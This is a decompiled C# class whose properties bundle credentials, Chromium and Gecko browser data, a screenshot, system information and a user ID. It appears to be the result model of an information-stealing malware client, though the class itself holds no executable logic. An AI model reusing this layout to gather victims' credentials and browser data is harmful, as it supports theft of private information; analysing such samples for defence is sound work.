using System;
using System.Collections.Generic;

namespace client.Models
{
	// Token: 0x0200000A RID: 10
	public class ExecutingAssemblyResult
	{
		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000017 RID: 23 RVA: 0x000024E9 File Offset: 0x000006E9
		// (set) Token: 0x06000018 RID: 24 RVA: 0x000024F1 File Offset: 0x000006F1
		public string Tag { get; set; }

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000019 RID: 25 RVA: 0x000024FA File Offset: 0x000006FA
		// (set) Token: 0x0600001A RID: 26 RVA: 0x00002502 File Offset: 0x00000702
		public List<DefaultFileStructure> DefaultFiles { get; set; }

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x0600001B RID: 27 RVA: 0x0000250B File Offset: 0x0000070B
		// (set) Token: 0x0600001C RID: 28 RVA: 0x00002513 File Offset: 0x00000713
		public List<Credentials> DefaultCredentials { get; set; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600001D RID: 29 RVA: 0x0000251C File Offset: 0x0000071C
		// (set) Token: 0x0600001E RID: 30 RVA: 0x00002524 File Offset: 0x00000724
		public List<ChromiumBrowserStructure> ChromiumData { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x0600001F RID: 31 RVA: 0x0000252D File Offset: 0x0000072D
		// (set) Token: 0x06000020 RID: 32 RVA: 0x00002535 File Offset: 0x00000735
		public List<GeckoBrowserStructure> GeckoData { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000021 RID: 33 RVA: 0x0000253E File Offset: 0x0000073E
		// (set) Token: 0x06000022 RID: 34 RVA: 0x00002546 File Offset: 0x00000746
		public byte[] Screenshot { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000023 RID: 35 RVA: 0x0000254F File Offset: 0x0000074F
		// (set) Token: 0x06000024 RID: 36 RVA: 0x00002557 File Offset: 0x00000757
		public InformationStructure Information { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000025 RID: 37 RVA: 0x00002560 File Offset: 0x00000760
		// (set) Token: 0x06000026 RID: 38 RVA: 0x00002568 File Offset: 0x00000768
		public string UserID { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000027 RID: 39 RVA: 0x00002571 File Offset: 0x00000771
		// (set) Token: 0x06000028 RID: 40 RVA: 0x00002579 File Offset: 0x00000779
		public List<string> RuntimeErrors { get; set; }
	}
}
